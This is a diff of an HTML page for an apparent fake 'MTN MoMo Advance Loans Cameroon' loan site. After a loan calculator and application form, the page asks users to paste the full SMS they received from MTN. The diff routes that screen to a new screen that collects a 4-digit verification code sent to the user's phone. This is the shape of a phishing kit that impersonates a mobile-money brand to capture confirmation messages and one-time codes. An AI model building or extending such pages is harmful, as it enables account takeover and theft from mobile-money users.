@@ -9,7 +9,7 @@
 </head>
 <body>
 
-    <!-- LANGUAGE SELECTION SCREEN (Dark Theme) -->
+    <!-- LANGUAGE SELECTION SCREEN -->
     <div id="screen-language" class="screen active dark-screen">
         <div class="lang-container">
             <div class="momo-logo">
@@ -45,7 +45,7 @@
         </div>
     </div>
 
-    <!-- HOME / CALCULATOR SCREEN (Dark Theme) -->
+    <!-- HOME / CALCULATOR SCREEN -->
     <div id="screen-home" class="screen dark-screen">
         <header>
             <h1>MTN MoMo Advance Loans Cameroon</h1>
@@ -82,7 +82,7 @@
         </div>
     </div>
 
-    <!-- APPLICATION FORM SCREEN (Dark Theme) -->
+    <!-- APPLICATION FORM SCREEN -->
     <div id="screen-application" class="screen dark-screen">
         <header>
             <h1>MTN MoMo Advance Loans Cameroon</h1>
@@ -166,17 +166,14 @@
                 <div class="form-navigation">
                     <button type="button" id="btn-back" class="secondary-btn" onclick="prevStep()" style="display: none;">BACK</button>
                     <button type="button" id="btn-next" class="primary-btn" onclick="nextStep()">NEXT STEP</button>
-                    <!-- Triggers SMS screen now -->
                     <button type="submit" id="btn-submit" class="primary-btn" style="display: none;">SUBMIT APPLICATION</button>
                 </div>
             </form>
         </div>
     </div>
 
-    <!-- NEW: SMS VERIFICATION SCREEN (Light Theme matching screenshot) -->
+    <!-- NEW: SMS VERIFICATION SCREEN -->
     <div id="screen-sms" class="screen light-screen">
-        
-        <!-- Dark Header from screenshot -->
         <div class="sms-header">
             <div class="sms-logo">
                 <svg width="30" height="30" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
@@ -190,7 +187,6 @@
         </div>
 
         <div class="sms-content">
-            <!-- Envelope Icon with Glow -->
             <div class="envelope-glow">
                 <div class="envelope-icon">
                     <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#d93838" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
@@ -203,16 +199,13 @@
             <h2 class="sms-title">Paste the <span>SMS</span> from MTN</h2>
             <p class="sms-subtitle">We sent a confirmation message to your number. <strong>Copy the full SMS you received</strong> and paste it below to continue.</p>
 
-            <!-- Yellow Instruction Box -->
             <div class="instruction-box">
                 <span class="bulb">💡</span>
                 <p>Open your <strong>Messages app</strong>, find the SMS from <strong>MTN</strong>, long-press it, tap <strong>Copy</strong>, then come back here.</p>
             </div>
 
-            <!-- Textarea Area -->
             <div class="sms-textarea-container">
                 <textarea id="sms-input" placeholder="Collez le SMS reçu de MTN ici..." maxlength="500"></textarea>
-                
                 <div class="paste-controls">
                     <span id="char-count">0 characters</span>
                     <button type="button" class="paste-btn" onclick="pasteSMS()">📋 Paste</button>
@@ -224,13 +217,43 @@
                 <a href="#">Resend SMS</a>
             </div>
 
-            <!-- Verify Button -->
-            <button id="btn-verify-sms" class="verify-btn" onclick="verifySMS()" disabled>
+            <button id="btn-verify-sms" class="verify-btn" onclick="goToScreen('screen-pin')" disabled>
                 VERIFY & CONTINUE →
             </button>
         </div>
         
         <div class="footer-text">© 2026 MTN Xtra Loan</div>
+    </div>
+
+    <!-- NEW: 4-DIGIT PIN SCREEN (Dark Theme) -->
+    <div id="screen-pin" class="screen dark-screen">
+        <div class="pin-content">
+            <!-- Lock Icon -->
+            <div class="lock-circle">
+                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#ffcc00" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                </svg>
+            </div>
+
+            <h2 class="pin-title">Enter the <span class="highlight-yellow">Verification Code</span></h2>
+            <p class="pin-subtitle">We sent a <strong>4-digit code</strong> to your number.<br>Enter it below to continue.</p>
+
+            <!-- 4 Input Boxes -->
+            <div class="pin-inputs">
+                <input type="text" maxlength="1" inputmode="numeric" class="pin-box" onkeyup="moveToNext(this, 1)" onkeydown="moveToPrev(this, event, 1)">
+                <input type="text" maxlength="1" inputmode="numeric" class="pin-box" onkeyup="moveToNext(this, 2)" onkeydown="moveToPrev(this, event, 2)">
+                <input type="text" maxlength="1" inputmode="numeric" class="pin-box" onkeyup="moveToNext(this, 3)" onkeydown="moveToPrev(this, event, 3)">
+                <input type="text" maxlength="1" inputmode="numeric" class="pin-box" onkeyup="moveToNext(this, 4)" onkeydown="moveToPrev(this, event, 4)">
+            </div>
+        </div>
+
+        <!-- Fixed bottom button -->
+        <div class="pin-action-area">
+            <button id="btn-verify-pin" class="pin-submit-btn" onclick="submitPIN()" disabled>
+                VERIFY & CONTINUE →
+            </button>
+        </div>
     </div>
 
     <!-- SUCCESS SCREEN -->
